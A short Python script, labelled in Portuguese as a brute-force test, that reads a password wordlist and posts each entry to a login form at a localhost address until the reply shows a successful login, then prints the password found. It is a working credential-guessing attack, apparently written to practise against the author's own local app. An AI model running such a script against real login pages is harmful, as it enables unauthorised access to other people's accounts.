import requests
import time
import os
print("xxxxxxx Brute Force teste xxxxxxx")
usuario = input("Usuário: ")
wordlist = open(".\wordlist.txt", "r").readlines()
wordlist = [x.replace("\n", "") for x in wordlist]

host = "http://127.0.0.1:5000/login"

# Payload
for senha in wordlist:
    login_data = {
        "nome": usuario,
        "password": senha}
    
    response = requests.post("http://127.0.0.1:5000/login", data=login_data).text
    if "Usuário Logado" not in response:
        os.system("clear || cls")
        print(f"Testando - {senha}")
        #time.sleep(0.1)
    else:
        os.system("clear || cls")
        print("="*40,"\n")
        print(f"\033[32m[+]\033[0;0m {host} \n\033[32m[+]\033[0;0m Senha encontrada - \033[32m{senha}\033[0;0m")
        print("\n\n\n")